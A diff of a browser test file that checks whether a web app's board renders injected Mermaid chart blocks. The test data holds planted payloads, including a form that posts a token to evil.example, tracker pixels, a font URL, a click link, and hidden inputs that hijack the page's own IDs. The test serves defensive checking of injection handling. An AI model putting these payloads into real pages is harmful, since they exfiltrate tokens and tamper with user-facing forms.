@@ -1109,7 +1109,7 @@ if (process.env.SYMPHONY_PROTOCOL) {
 const PLANTED = [
   ['Planted: an image', 'flowchart TD\n  A["<img src=https://tracker.example/pixel.png>"]'],
   ['Planted: a form', 'flowchart TD\n  A["<form action=https://evil.example/collect method=post><input name=token><button>Go</button></form>"]'],
-  ['Planted: the page\'s own fields', 'flowchart TD\n  A["<input type=hidden id=cp-task-title value=Planted><textarea id=cp-prompt>Planted</textarea>"]'],
+  ['Planted: the page\'s own fields', 'flowchart TD\n  A["<input type=hidden id=cp-task-title value=Planted><textarea id=cp-task-ask>Planted</textarea>"]'],
   ['Planted: a directive', '%%{init: {"fontFamily": "x; src: url(https://tracker.example/font.woff)"}}%%\nflowchart TD\n  i1["#1 a"]'],
   ['Planted: a link', 'flowchart TD\n  i1["#1 a"]\n  click i1 href "https://evil.example/a"'],
   ['Planted: a raw label', 'flowchart TD\n  i1["#1 <b>bold</b> $$x$$"]:::todo'],
@@ -1130,9 +1130,9 @@ await check('X: the Board tab draws a block of the board\'s text only where ever
       notDrawn: Array.from(box.querySelectorAll('p')).filter((p) => /^Not drawn: this block is not a chart as the board writes it/.test(p.textContent)).length,
       shownAsText: Array.from(box.querySelectorAll('pre')).map((pre) => pre.textContent),
       hosts: box.querySelectorAll('[data-chart]').length,
-      taskTitle: document.getElementById('cp-task-title') && !!document.getElementById('cp-task-title').closest('#tab-tasks'),
-      prompt: document.getElementById('cp-prompt') && !document.getElementById('cp-prompt').closest('#cp-board'),
-      ids: document.querySelectorAll('#cp-task-title').length + ':' + document.querySelectorAll('#cp-prompt').length,
+      taskTitle: document.getElementById('cp-task-title') && !!document.getElementById('cp-task-title').closest('#dlg-task'),
+      prompt: document.getElementById('cp-task-ask') && !document.getElementById('cp-task-ask').closest('#cp-board'),
+      ids: document.querySelectorAll('#cp-task-title').length + ':' + document.querySelectorAll('#cp-task-ask').length,
     };
   });
   const elsewhere = requests.filter((u) => !u.startsWith(BASE) && !/^https:\/\/api\.github\.com\//.test(u) && !/^https:\/\/fonts\.(googleapis|gstatic)\.com\//.test(u));
@@ -1143,7 +1143,7 @@ await check('X: the Board tab draws a block of the board\'s text only where ever
   assert.deepEqual(seen.shownAsText, PLANTED.map((b) => b[1]));
   // only the board's own two blocks keep the text they are drawn from
   assert.equal(seen.hosts, 2, 'a planted block kept its text to be drawn');
-  assert.equal(seen.taskTitle, true, 'the task form\'s title is not the Tasks tab\'s own field');
+  assert.equal(seen.taskTitle, true, 'the task dialog\'s title is not the page\'s own field');
   assert.equal(seen.prompt, true);
   assert.equal(seen.ids, '1:1', 'a planted field took one of the page\'s ids');
   assert.deepEqual(elsewhere, []);
